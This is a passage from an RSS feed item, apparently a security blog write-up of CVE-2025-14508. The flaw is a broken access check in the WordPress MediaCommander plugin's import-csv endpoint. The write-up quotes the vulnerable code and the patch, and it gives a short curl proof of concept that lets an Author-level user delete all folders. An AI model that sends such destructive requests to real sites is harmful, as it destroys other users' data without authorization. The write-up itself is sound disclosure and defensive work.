to Media, Posts, and Pages Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;MediaCommander – Bring Folders to Media, Posts, and Pages&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.3.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a &lt;strong&gt;REST API&lt;/strong&gt; endpoint &lt;code&gt;/import-csv&lt;/code&gt; with POST method as follows:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    MEDIACOMMANDER_PLUGIN_REST_URL, // mediacommander/v1&#xA;    &amp;#39;/import-csv&amp;#39;,&#xA;    [&#xA;        &amp;#39;methods&amp;#39; =&amp;gt; \WP_REST_Server::CREATABLE, // POST&#xA;        &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;importCSV&amp;#39; ],&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; [ $this, &amp;#39;canUploadFiles&amp;#39; ]&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;permission_callback&lt;/code&gt; is &lt;code&gt;canUploadFiles&lt;/code&gt; to check capabilities:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function canUploadFiles() {&#xA;    return current_user_can( &amp;#39;upload_files&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;upload_files&lt;/code&gt; capability is for users from Author level and above.&lt;/li&gt;&#xA;&lt;li&gt;If the user lacks the capability, the REST API returns 403.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;If the user has the capability, the callback &lt;code&gt;importCSV&lt;/code&gt; is executed:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function importCSV( \WP_REST_Request $request ) {&#xA;    $params  = $request-&amp;gt;get_file_params();&#xA;    $file = $params[&amp;#39;file&amp;#39;][&amp;#39;tmp_name&amp;#39;];&#xA;    $clear  = filter_var( $request-&amp;gt;get_param( &amp;#39;clear&amp;#39; ), FILTER_VALIDATE_BOOLEAN );&#xA;    $attachments  = filter_var( $request-&amp;gt;get_param( &amp;#39;attachments&amp;#39; ), FILTER_VALIDATE_BOOLEAN );&#xA;&#xA;    $data = FoldersModel::importCSV( $file, $clear, $attachments );&#xA;    $response = isset( $data ) ? [ &amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;data&amp;#39; =&amp;gt; $data ] : [ &amp;#39;success&amp;#39; =&amp;gt; false ];&#xA;&#xA;    return new \WP_REST_Response( $response );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;importCSV&lt;/code&gt; performs:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Retrieves the CSV file from the request.&lt;/li&gt;&#xA;&lt;li&gt;Retrieves the &lt;code&gt;clear&lt;/code&gt; and &lt;code&gt;attachments&lt;/code&gt; parameters and converts them to boolean.&lt;/li&gt;&#xA;&lt;li&gt;Calls &lt;code&gt;FoldersModel::importCSV&lt;/code&gt; to process the CSV data.&lt;/li&gt;&#xA;&lt;li&gt;Returns JSON containing &lt;code&gt;success&lt;/code&gt; and &lt;code&gt;data&lt;/code&gt; (if any) or &lt;code&gt;success: false&lt;/code&gt; on failure.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-warning&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M6.457 1.047c.659-1.234 2.427-1.234 3.086.0l6.082 11.378A1.75 1.75.0 0114.082 15H1.918A1.75 1.75.0 01.375 12.425zm1.763.707a.25.25.0 00-.44.0L1.698 13.132a.25.25.0 00.22.368h12.164a.25.25.0 00.22-.368zm.53 3.996v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 11a1 1 0 11-2 0 1 1 0 012 0z&#34;/&gt;&lt;/svg&gt;Warning&lt;/p&gt;&lt;p&gt;The &lt;code&gt;clear&lt;/code&gt; parameter will delete all existing folders if set to &lt;code&gt;true&lt;/code&gt;.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-15-cve-2025-14508/clear.png&#34; title=&#34;Clear parameter&#34; data-thumbnail=&#34;/posts/2025-12-15-cve-2025-14508/clear.png&#34; data-sub-html=&#34;&lt;h2&gt;clear&lt;/h2&gt;&lt;p&gt;Clear parameter&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-15-cve-2025-14508/clear.png&#39; alt=&#34;clear&#34; height=&#34;209&#34; width=&#34;1091&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Clear parameter&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Patch (v2.4.0)&lt;/strong&gt; fixes the vulnerability by changing the capability check logic:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    MEDIACOMMANDER_PLUGIN_REST_URL,&#xA;    &amp;#39;/import-csv&amp;#39;,&#xA;    [&#xA;        &amp;#39;methods&amp;#39; =&amp;gt; \WP_REST_Server::CREATABLE,&#xA;        &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;importCSV&amp;#39; ],&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; [ $this, &amp;#39;canManageOptions&amp;#39; ]&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;permission_callback&lt;/code&gt; is &lt;code&gt;canManageOptions&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function canManageOptions() {&#xA;    return current_user_can( &amp;#39;manage_options&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;manage_options&lt;/code&gt; capability is for users from Administrator level and above.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Authenticated user (Author&amp;#43;)&amp;#34;] --&amp;gt; B[&amp;#34;POST /wp-json/mediacommander/v1/import-csv&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;permission_callback: canUploadFiles()&amp;#34;]&#xA;C --&amp;gt; D{&amp;#34;Has upload_files capability?&amp;#34;}&#xA;D -- Yes --&amp;gt; E[&amp;#34;importCSV() executes&amp;#34;]&#xA;D -- No --&amp;gt; Z[&amp;#34;403 Forbidden&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Read CSV file and parameters (clear, attachments)&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;clear == true?&amp;#34;}&#xA;G -- Yes --&amp;gt; H[&amp;#34;Delete all existing folders&amp;#34;]&#xA;H --&amp;gt; K[&amp;#34;Broken Access Control: destructive action allowed for Author&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login with Author account&lt;/li&gt;&#xA;&lt;li&gt;Retrieve the &lt;code&gt;nonce&lt;/code&gt; from the response:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-15-cve-2025-14508/nonce.png&#34; title=&#34;Nonce in response&#34; data-thumbnail=&#34;/posts/2025-12-15-cve-2025-14508/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Nonce in response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-15-cve-2025-14508/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;310&#34; width=&#34;926&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce in response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Send request with the &lt;code&gt;X-WP-Nonce&lt;/code&gt; header set to the &lt;code&gt;nonce&lt;/code&gt; value from the response:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -X POST &amp;#34;http://localhost/wp-json/mediacommander/v1/import-csv&amp;#34; \&#xA;  -H &amp;#34;Cookie: Author cookie&amp;#34; \&#xA;  -H &amp;#34;X-WP-Nonce: 7323b67e07&amp;#34; \&#xA;  -F &amp;#34;file=@./file.csv&amp;#34; \&#xA;  -F &amp;#34;clear=true&amp;#34; \&#xA;  -F &amp;#34;attachments=false&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-14508 shows that the plugin &lt;strong&gt;MediaCommander ≤ 2.3.1&lt;/strong&gt; allows &lt;strong&gt;Author or higher users&lt;/strong&gt; to perform &lt;strong&gt;full folder deletion&lt;/strong&gt; of other users via the REST API &lt;code&gt;import-csv&lt;/code&gt;. The root cause is &lt;strong&gt;missing proper capability checks&lt;/strong&gt; for destructive actions. Patch &lt;strong&gt;2.4.0&lt;/strong&gt; fixes this by raising the capability check to &lt;strong&gt;Administrator&lt;/strong&gt; (&lt;code&gt;manage_options&lt;/code&gt;), preventing unauthorized deletion.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Always assign capabilities according to the risk level of the action (destructive actions should be Administrator only).&lt;/li&gt;&#xA;&lt;li&gt;Capability checks in REST API must match the nature of the operation, not just basic rights like &lt;code&gt;upload_files&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Parameters like &lt;code&gt;clear&lt;/code&gt; can cause &lt;strong&gt;total data loss&lt;/strong&gt;, so handle carefully and combine with proper capability checks.&lt;/li&gt;&#xA;&lt;li&gt;Correct use of nonce and cookies cannot compensate for &lt;strong&gt;broken access control&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/mediacommander/vulnerability/wordpress-mediacommander-plugin-2-3-1-missing-authorization-to-authenticated-author-media-folder-deletion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MediaCommander – Bring Folders to Media, Posts, and Pages Plugin &amp;lt;= 2.3.1 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
